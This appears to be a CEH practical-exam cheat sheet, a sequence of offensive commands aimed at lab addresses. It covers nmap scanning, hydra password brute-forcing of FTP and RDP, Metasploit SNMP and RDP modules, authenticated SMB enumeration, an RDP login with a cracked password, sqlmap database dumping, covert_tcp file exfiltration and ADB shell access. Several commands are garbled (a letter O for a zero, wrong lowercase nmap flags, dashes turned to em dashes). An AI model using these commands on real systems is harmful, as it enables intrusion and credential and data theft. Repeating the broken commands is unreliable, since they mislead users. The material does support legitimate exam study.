**Scanning Network using Nmap**

Scanning network Live Host (ping sweep): nmap -sP IP/CIDR  
Scanning Live Host without port scan in same subnet (ARP scan) : nmap -PR -sn IP/CIDR
Scripts + Version running on target machine: nmap -sC -sV IP/CIDR  
OS of the target: nmap -O IP  
All open ports of the target: nmap -p- IP/CIDR  
Specific port scan of the target: nmap -p<port-number> IP/CIDR  
Aggressive Scan: nmap -A IP/CIDR  
Scanning using NSE scripts: nmap --scripts <script_name> -p <port> IP/CIDR  
Scripts + Version + Ports + OS Scan (Overall): nmap -sc -sv -p- -A -v -T4 IPICIDR  

**Brute force ftp**  
nmap -sc -p 21 192.135.117.3  
hydra -L /usr/share/wordlists/metasploit/canron_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.135.117.3 ftp  

**SNMP Check-enumeration**  
snmp-check 192.151.62.3 
nmap -sU -p 161 --script=smnp-processes 192.151.62.3  

**SNMP Exploit**  
msf5 > use auxiliary/scanner/snmp/snmp_login  
set RHOSTS 192.151.62.3
exploit  

**SMB Enumeration**  
nmap 10.4.29.134 (smb runns on 445 port)  
nmap -p 445 --script smb-enum-shares 10.4.29.134  
next step to Connect SMB using GUI Method  
next step Gredentials from ftp step  

**Enumerating users**  
nmap -p 445 --script smb-enum-users 10.4.29.134  
nmap -p 445 --script smb-enum-users --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134 (getting users from machine)    
nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134 (getting groups and users from machine)  

**What to Hack?**  
Network File shares  
Logged in Users details  
Workgroups  
security level informationl  
Domains & Services  

nmap -sC -sV -A -T4 -p445 10.4.29.134  
nmap -p 445 --script smb-enum-services --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134  

**Exploiting RDP Service**  
Remote Desktop Protocol : 3389  
Protocol used for remotely accessing the computers  

msfconsole  
use auxiliary/scanner/rdp/rdp_scanner  
set RHOSTS 10.5.17.119  
set RPORT 3333  
exploit (it show if RDP is running on this target)  
next step is to run Hydra tool to brute force  
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://lO.5.17.119 -s 3333  
next step to initialize an RDP session  
xfreerdp /u:administrator /p:qwertyuiop /v: 10.5.17.119:3333  

**NetBIOS Enumeration**  
Port - 137/138/139  
NBName: 137/UDP  
NBName: 137/TCP  
NBDatagram: 138/UDP  
NBSession: 139/TCP  
Network Basic Input Output System  
Facilitates and allows computer to connect over the local network, access shared
resources, such as files and printers, and to find each other.  


nmap -sV --script nbstat.nse 192.72.120.3  

**Wireshark > Pcap File Analysis**  

using filters in Wireshark : 
tcp.flags.syn==1  
click on a packet right click on it follow -> TCP Stream OR HTTP Stream (in the new window click on the right bottom to change Stream)  

Extract files with Wireshark :  
File -> Export Objects -> choose one from the available options  

Click Bottom left on Wireshark to show properties of the pcap file.  
Find Strings with CTRL+F  

**Steganography**  
TOOLS  
SNOW - For hiding and extracting hidden data from a text file  
Openstego - For hiding and extracting hidden data from an image file  
Covert TCP - For hiding data in TCP/IP packet headers  

SNOW  
Hide a file  
windows cmd : SNOW.EXE -C -m "You can clear the CEH Exam 9090' —p "pa$$word" Secret.txt Hiddensecret.txt  
HINT: When we press CTRL+A (choose all) using a text editor is possible to see spaces and new lines that are more than the actuall text.  
windows cmd : SNOW.EXE —C —p "pa$$word" Hiddensecret.txt (output will be the secret message)  

Openstego  
Openstego is a gui app to hide or extract files inside an image.  
Hint: extract process can produce file that maybe has a hashed value  

Covert TCP  
www-scf.usc.edu/~csa5301/downloads/covert_tcp.c (download save as "covert-tcp.c" and run)  
cc -o covert_tcp covert_tcp.c  
For receiving/listening: ./covert_tcp -dest <Dest-lP> -source <Source-lP> -source_port 9999 -dest_port 8888 -server -file /path/to/file.txt  
For sending: ./covert_tcp -dest <Dest-lP> -source <Source-lP> -source_port 8888 -dest_port 9999 -file /path/to/file.txt  

**Cryptography**  
Tools  
Hashmyfiles- For calculating and comparing hashes of files  
Cryptool - For encryption/decryption of the hex data - by manipulating the key length (https://www.youtube.com/watch?v=wywTyONpbMc&t=370s)    
BcTextEncoder- For encoding and decoding text in file (.hex)  
CryptoForge - For encrypting and decrypting the files  
VeraCrypt - For hiding and Encrypting the disk partitions  

**Hacking Web & Android**  
SQLMap - For finding SQL Injection Vulnerabilities  
Wpscan - Scanning and Finding issues in wordpress websites  
ADB For connecting Android devices to PC and binary analysis  
Burpsuite - For analysing and manipulating the traffic  

SQLMAP    

Using SQLMAP with BurpSuite. Right Click on request and save it as an item (when webapp is using Cookies etc.)  
$sqlmap -r req.txt --dbs (req.txt is the saved file from BurpSuite)  
$sqlmap -r req.txt -D DVWA --table (DVWA the name of the database, --table will give us names of tables)  
$sqlmap -r req. txt -D dvwa --dump 

WPSCAN  

$wpscan --url http://10.10.14.187/ --enumerate u  

ADB Tool (Android Debug Bridge)  
ADB suppose to be installed in a Windows machine using Power Shell  
C:\users\example-user>adb devices  
-output example-  
List Of devices attached  
192.168.0.100:5555  device  
C:\users\example-user>adb connect 192.168.0.100:5555  
-output example-  
already connected to 192.168. O. 100: 5555  
C:\users\example-user>adb shell  
device123#@:/ $ whoami (shows shell for permissions)  
device123#@:/ $ cd sdcard (navigate to sdcard)  
device123#@:/ $ ls (try to find the secret)
